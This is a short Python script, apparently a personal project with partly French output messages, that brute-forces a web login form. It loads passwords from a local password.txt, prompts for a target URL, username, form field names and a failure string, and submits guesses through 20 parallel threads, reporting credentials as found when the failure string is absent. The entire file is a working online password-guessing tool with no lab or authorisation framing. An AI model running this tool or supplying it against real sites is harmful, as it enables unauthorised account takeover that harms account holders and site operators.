import requests
from concurrent.futures import ThreadPoolExecutor

#Read "password.txt" to use it
def get_passwords():
    passwords = []
    with open("password.txt", "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            line = line.strip()  
            if line:
                passwords.append(line)
    return passwords


def try_password(user, password, target_url, user_field, pass_field, failure_str, session):
    
    #This is what is submitted via the form
    data = {
        user_field: user,
        pass_field: password
    }
    
    #Send a POST request to the server 
    response = session.post(target_url, data=data)
    print(f"[*] Tentative -> {user}:{password}")
    
    #If the error message isn't in the response, return True because the password has been found otherwise, return False
    if failure_str not in response.text:
        print(f"[+] Credentials trouvés ! {user}:{password}")
        return True
    return False


def start_bruteforce(user, passwords, target_url, user_field, pass_field, failure_str):
    
    #Reuse the same connection across multiple requests, rather than opening a new one each time
    session = requests.Session()
    
    #Creation of 20 workers to increase execution speed 
    with ThreadPoolExecutor(max_workers=20) as executor:
        
        #For any password, one worker try the function try_password
        futures = {executor.submit(try_password, user, password, target_url, user_field, pass_field, failure_str, session): password for password in passwords}
        
        #future.result() wait the response of the worker (True or False) to return it
        for future in futures:
            if future.result():
                executor.shutdown(wait=False)
                return

    print("[-] Aucun mot de passe trouvé.")


def main():
    passwords_list = get_passwords()
    
    target_url  = input("what is the target URL ? : ")
    user        = input("what is the username ? : ")
    user_field  = input("what is the username field name ? : ")
    pass_field  = input("what is the password field name ? : ")
    failure_str = input("what is the failure string ? : ")
 
    start_bruteforce(user, passwords_list, target_url, user_field, pass_field, failure_str)
 
main()